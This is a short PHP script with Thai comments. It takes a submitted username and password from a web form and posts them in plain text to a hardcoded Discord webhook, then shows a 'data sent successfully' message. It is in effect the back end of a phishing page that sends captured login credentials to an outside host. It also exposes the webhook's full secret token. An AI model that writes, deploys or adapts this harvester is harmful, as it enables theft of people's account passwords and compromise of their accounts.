<?php
// รับข้อมูลจากฟอร์ม
$username = $_POST['username'];
$password = $_POST['password'];

// กำหนด URL ของ Discord Webhook
$webhook_url = "https://discord.com/api/webhooks/1312092308895699035/ypBt7VvBXjOEHNqXioNGS-mGM83MfOxcbow7mlb___X0ufrTVwyIjOjEWT0mpa-Apm1t";

// สร้างข้อความเพื่อส่งไปยัง Discord
$data = [
    "content" => "**ข้อมูลทดลองเก็บได้:**\nUsername: $username\nPassword: $password",
];

// ส่งข้อมูลไปยัง Webhook Discord
$options = [
    "http" => [
        "header" => "Content-Type: application/json\r\n",
        "method" => "POST",
        "content" => json_encode($data),
    ],
];
$context = stream_context_create($options);
file_get_contents($webhook_url, false, $context);

// แสดงข้อความว่าได้รับข้อมูลเรียบร้อยแล้ว
echo "ข้อมูลได้ถูกส่งเรียบร้อยแล้ว!";
?>
